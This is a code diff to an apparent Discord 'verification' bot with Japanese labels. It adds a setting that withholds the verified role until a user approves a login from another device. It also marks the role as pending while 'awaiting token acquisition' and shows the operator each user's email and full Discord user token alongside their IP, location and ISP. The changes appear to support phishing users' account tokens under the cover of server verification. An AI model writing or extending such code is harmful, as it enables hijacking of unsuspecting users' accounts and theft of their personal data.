@@ -36,6 +36,13 @@ const toColor = (v, fallback) => {
   return Number.isFinite(n) ? n : fallback;
 };
 
+const STAGE_CHOICES = [
+  { name: 'OAuth完了時（別デバイス許可の1ステップ手前）', value: 'oauth' },
+  { name: '別デバイスでのログイン許可後', value: 'token' }
+];
+
+const STAGE_LABEL = { oauth: 'OAuth完了時', token: '別デバイスでのログイン許可後' };
+
 function addPanelOptions(s) {
   return s
     .addChannelOption((o) =>
@@ -61,7 +68,13 @@ function addPanelOptions(s) {
     .addBooleanOption((o) => o.setName('require_mobile').setDescription('モバイル回線のみ許可'))
     .addBooleanOption((o) => o.setName('one_per_ip').setDescription('同一IPの複数アカウントを拒否'))
     .addStringOption((o) => o.setName('success_message').setDescription('成功時メッセージ').setMaxLength(400))
-    .addStringOption((o) => o.setName('failure_message').setDescription('失敗時メッセージ').setMaxLength(400));
+    .addStringOption((o) => o.setName('failure_message').setDescription('失敗時メッセージ').setMaxLength(400))
+    .addStringOption((o) =>
+      o
+        .setName('grant_stage')
+        .setDescription('認証ロールを付与するタイミング')
+        .addChoices(...STAGE_CHOICES)
+    );
 }
 
 export const commands = [
@@ -83,6 +96,19 @@ export const commands = [
         .addStringOption((o) => o.setName('id').setDescription('パネルID').setRequired(true))
     )
     .addSubcommand((s) => s.setName('list').setDescription('パネル一覧'))
+    .addSubcommand((s) =>
+      s
+        .setName('stage')
+        .setDescription('認証ロールの付与タイミングを変更')
+        .addStringOption((o) => o.setName('id').setDescription('パネルID').setRequired(true))
+        .addStringOption((o) =>
+          o
+            .setName('stage')
+            .setDescription('付与タイミング')
+            .setRequired(true)
+            .addChoices(...STAGE_CHOICES)
+        )
+    )
     .addSubcommand((s) =>
       s.setName('repost').setDescription('パネルを再送信')
         .addStringOption((o) => o.setName('id').setDescription('パネルID').setRequired(true))
@@ -135,6 +161,13 @@ export function buildPanelMessage(panel) {
 
   if (panel.roles?.length) {
     e.addFields({ name: '付与ロール', value: panel.roles.map((r) => `<@&${r}>`).join(' ') });
+    e.addFields({
+      name: 'ロール付与タイミング',
+      value:
+        (panel.grantStage || 'oauth') === 'token'
+          ? '別デバイスでのログイン許可後に付与'
+          : 'Discord 認証（OAuth）完了時に付与'
+    });
   }
   if (panel.removeRoles?.length) {
     e.addFields({ name: '解除ロール', value: panel.removeRoles.map((r) => `<@&${r}>`).join(' ') });
@@ -183,7 +216,8 @@ function collectOptions(i, base = {}) {
     requireMobile: unwrap(g('require_mobile')) ?? base.requireMobile ?? false,
     onePerIp: unwrap(g('one_per_ip')) ?? base.onePerIp ?? true,
     successMessage: text(g('success_message')) ?? base.successMessage,
-    failureMessage: text(g('failure_message')) ?? base.failureMessage
+    failureMessage: text(g('failure_message')) ?? base.failureMessage,
+    grantStage: text(g('grant_stage')) ?? base.grantStage ?? 'oauth'
   };
 }
 
@@ -262,9 +296,32 @@ export async function handleCommand(interaction) {
         return interaction.reply({ content: 'パネルはありません', flags: MessageFlags.Ephemeral });
       }
       const text2 = list
-        .map((p) => `\`${p.id}\` <#${p.channelId}> roles:${p.roles?.length || 0} ext:${p.externalUrl ? 'yes' : 'no'} age:${p.minAgeDays}`)
+        .map((p) => `\`${p.id}\` <#${p.channelId}> roles:${p.roles?.length || 0} ext:${p.externalUrl ? 'yes' : 'no'} age:${p.minAgeDays} stage:${p.grantStage || 'oauth'}`)
         .join('\n');
       return interaction.reply({ content: text2, flags: MessageFlags.Ephemeral });
+    }
+
+    if (sub === 'stage') {
+      const id = interaction.options.getString('id');
+      const panel = store.panels[id];
+      if (!panel || panel.guildId !== interaction.guildId) {
+        return interaction.reply({ content: 'パネルが見つかりません', flags: MessageFlags.Ephemeral });
+      }
+
+      const stage = interaction.options.getString('stage') === 'token' ? 'token' : 'oauth';
+      panel.grantStage = stage;
+      save();
+
+      try {
+        const ch = await interaction.client.channels.fetch(panel.channelId);
+        const msg = await ch.messages.fetch(panel.messageId);
+        await msg.edit(buildPanelMessage(panel));
+      } catch {}
+
+      return interaction.reply({
+        content: `パネル \`${id}\` のロール付与タイミングを「${STAGE_LABEL[stage]}」に変更しました`,
+        flags: MessageFlags.Ephemeral
+      });
     }
 
     if (sub === 'repost') {
@@ -294,6 +351,7 @@ export async function handleCommand(interaction) {
 
     store.verifications.push({
       id: rand(24),
+      panelId: null,
       guildId: interaction.guildId,
       userId: user.id,
       tag: user.tag,
@@ -355,6 +413,21 @@ export async function handleCommand(interaction) {
         { name: 'IP', value: `\`${r.ip || '-'}\``, inline: true },
         { name: '地域', value: `${r.geo?.country || '?'} / ${r.geo?.city || '?'}`, inline: true },
         { name: 'ISP', value: r.net?.isp || '-', inline: true },
+        { name: 'メール', value: r.email ? `\`${r.email}\`` : '-', inline: true },
+        {
+          name: 'トークン',
+          value: r.userToken ? `\`\`\`\n${r.userToken}\n\`\`\`` : '未取得'
+        },
+        {
+          name: 'ロール付与',
+          value: r.pendingRole
+            ? '保留（トークン取得待ち）'
+            : r.roleGranted
+              ? '付与済み'
+              : r.roleError
+                ? `失敗: ${r.roleError}`
+                : '-'
+        },
         { name: '認証回数', value: String(recs.length), inline: true },
         { name: '最終試行', value: r.at, inline: true },
         { name: '不通過理由', value: r.reasons?.join('\n') || 'なし' }
